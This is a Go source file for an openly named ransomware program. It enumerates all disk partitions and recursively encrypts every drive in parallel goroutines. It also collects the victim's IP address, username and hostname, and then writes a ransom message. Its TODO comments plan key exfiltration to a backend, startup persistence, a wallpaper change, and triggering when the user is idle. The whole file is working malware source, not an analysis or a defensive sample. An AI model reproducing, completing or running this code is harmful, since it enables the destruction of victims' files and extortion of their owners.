package main

import (
	"fmt"
	go_grab_ip "github.com/PaulDotSH/go-grab-ip"
	"github.com/shirou/gopsutil/disk"
	"go-evil-ransomware/ransom"
	"os"
	"os/user"
	"runtime"
	"sync"
)

//TODO: uncheck read only from files if able to do so
//Sends encryption key, computer and ip details to a backend (as JSON)
//Files are decryptable with the same exe when providing the decryption parameters to the process
//Generates a thread for all drives (so encryption is faster)
//Other options to send encryption key, i.e. smtp/ftp
//Add advanced settings like wait for internet and when to send the key (adt the start or at the end of encryption)
//add the option to change the user's wallpaper
//add stuff to startup*
//check if unicode paths work correctly
//maybe add a setting to start the ransomware when the user was afk for more than X minutes

func init() {
	//wait until there's internet
}

type RansomData struct {
	IPData       go_grab_ip.IPData
	Key          string
	Username     string
	ComputerName string
	UUID         string
}

func main() {
	partitions, _ := disk.Partitions(false)

	var wg sync.WaitGroup

	//Handle decryption
	if len(os.Args) > 2 && os.Args[1] == "decrypt" {
		keyBytes := []byte(os.Args[2])
		for _, partition := range partitions {
			wg.Add(1)
			go func() {
				defer wg.Done()
				var err error
				if runtime.GOOS == "windows" {
					err = ransom.RecursivelyEncryptDirectory(partition.Mountpoint+"\\", keyBytes)
				} else {
					err = ransom.RecursivelyEncryptDirectory(partition.Mountpoint, keyBytes)
				}
				if err != nil {
					fmt.Println(err)
				}
			}()
		}
		wg.Wait()
		fmt.Println("Done...")
		return
	}

	var data RansomData
	data.UUID = ransom.UUID
	data.IPData = go_grab_ip.AwaitIPData()
	data.Key = ransom.Key

	o, _ := user.Current()
	data.Username = o.Username
	hostname, _ := os.Hostname()
	data.ComputerName = hostname

	fmt.Println(data)

	if ransom.Debug {
		return
	}

	//for each partition, launch a new routine and wait for all to complete
	//because the ransomware will recursively run on /, it will on any partition anyway but not concurrently, think of a way to skip checking already encrypted paths that
	//doesn't affect performance
	fmt.Println("WARNING: Starting to encrypt files...")
	keyBytes := []byte(data.Key)
	for _, partition := range partitions {
		wg.Add(1)

		go func() {
			defer wg.Done()
			var err error
			if runtime.GOOS == "windows" {
				err = ransom.RecursivelyEncryptDirectory(partition.Mountpoint+"\\", keyBytes)
			} else {
				err = ransom.RecursivelyEncryptDirectory(partition.Mountpoint, keyBytes)
			}

			if err != nil {
				fmt.Println(err)
			}
		}()
	}
	wg.Wait()
	ransom.CreateMessage()
	fmt.Println("Exiting...")
}
